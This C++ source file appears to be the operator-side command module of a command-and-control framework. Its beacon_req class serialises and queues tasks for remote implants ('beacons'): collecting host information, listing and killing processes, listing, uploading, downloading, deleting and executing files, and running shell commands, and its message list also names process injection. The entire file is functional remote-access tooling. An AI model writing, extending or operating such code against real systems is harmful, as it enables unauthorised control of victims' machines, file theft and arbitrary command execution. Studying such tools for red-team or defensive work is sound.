/*
 * Copyright (c) 2021.  https://github.com/geemion
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <sstream>
#include "beacon_req.h"
#include "teamrpc.pb.h"
#include "taskdata.pb.h"

extern const std::string MSGID_NAME[c2::MSGID_ARRAYSIZE] = { "PUBKEY_REQ","PUBKEY_RSP","AUTH_REQ","AUTH_RSP",
"HOST_INFO_REQ","HOST_INFO_RSP","HEAT_BEAT_REQ","PROCESS_INFO","PROCESS_KILL","PROCESS_INJECT","DISK_LIST","FILE_LIST",
"DOWNLOAD_FILE","UPLOAD_FILE","EXEC_FILE", "CMD_COMMAND","ERROR_RSP","DELETE_FILE" };

beacon_req::beacon_req(PolyM::Queue* mq, log_func func) :req_mq_(mq), log_out_(func)
{

}

void beacon_req::send_get_host_info(const std::string& beacon_id)
{
	return put_cmd_req(beacon_id, c2::HOST_INFO_REQ);
}

void beacon_req::send_get_process_list(const std::string& beacon_id)
{
	return put_cmd_req(beacon_id, c2::PROCESS_INFO);
}

void beacon_req::send_kill_process(const std::string& beacon_id, int pid)
{
	c2::IntParam param;
	param.set_param(pid);

	std::vector<char> data(param.ByteSizeLong());
	param.SerializeToArray(data.data(), data.size());

	return put_cmd_req(beacon_id, c2::PROCESS_KILL, data.data(), data.size());
}

void beacon_req::send_get_disk_list(const std::string& beacon_id)
{
	return put_cmd_req(beacon_id, c2::DISK_LIST);
}

void beacon_req::send_get_file_list(const std::string& beacon_id, const std::string& dir)
{
	return put_strparam_req(beacon_id, c2::FILE_LIST, dir);
}

void beacon_req::send_upload_file(const std::string& beacon_id, const std::string& upload_dir, const std::string& file_name, const QByteArray& file_data)
{
	c2::UploadFile upload_data;
	upload_data.set_upload_dir(upload_dir);
	upload_data.set_file_name(file_name);
	upload_data.set_file_data(file_data.data(), file_data.size());

	std::vector<char> data(upload_data.ByteSizeLong());
	upload_data.SerializeToArray(data.data(), data.size());

	return put_cmd_req(beacon_id, c2::UPLOAD_FILE, data.data(), data.size());
}

void beacon_req::send_delete_file(const std::string& beacon_id, const std::string& file_path)
{
	return put_strparam_req(beacon_id, c2::DELETE_FILE, file_path);
}

void beacon_req::send_download_file(const std::string& beacon_id, const std::string& file_path)
{
	return put_strparam_req(beacon_id, c2::DOWNLOAD_FILE, file_path);
}

void beacon_req::send_exec_file(const std::string& beacon_id, const std::string& file_path)
{
	return put_strparam_req(beacon_id, c2::EXEC_FILE, file_path);
}

void beacon_req::send_shell_cmd(const std::string& beacon_id, const std::string& path, const std::string& cmd)
{
	c2::CMDPARAM param;
	param.set_current_dir(path);
	param.set_cmd(cmd);

	std::vector<char> data(param.ByteSizeLong());
	param.SerializeToArray(data.data(), data.size());

	return put_cmd_req(beacon_id, c2::CMD_COMMAND, data.data(), data.size());
}

void beacon_req::put_strparam_req(const std::string& beacon_id, int msg_id, const std::string str_param)
{
	c2::StrParam param;
	param.set_param(str_param);

	std::vector<char> data(param.ByteSizeLong());
	param.SerializeToArray(data.data(), data.size());

	return put_cmd_req(beacon_id, msg_id, data.data(), data.size());
}

void beacon_req::put_cmd_req(const std::string& beacon_id, int msg_id, const void* byte_value/*=nullptr*/, size_t byte_value_size/*=0*/)
{
	c2::CommandReq req;
	req.set_beacon_id(beacon_id);
	req.set_msg_id(msg_id);
	if (byte_value != nullptr && byte_value_size != 0)
		req.set_byte_value(byte_value, byte_value_size);

	std::ostringstream log_stream;
	log_stream << "[*] " << "send command:" << beacon_id << " " << MSGID_NAME[msg_id] << "(" << msg_id << ")" << std::endl;
	log_out_(log_stream.str());

	auto size = req.ByteSizeLong();
	std::vector<char> data(size);
	req.SerializePartialToArray(data.data(), size);
	req_mq_->put(PolyM::DataMsg<std::vector<char>>(1, data));
}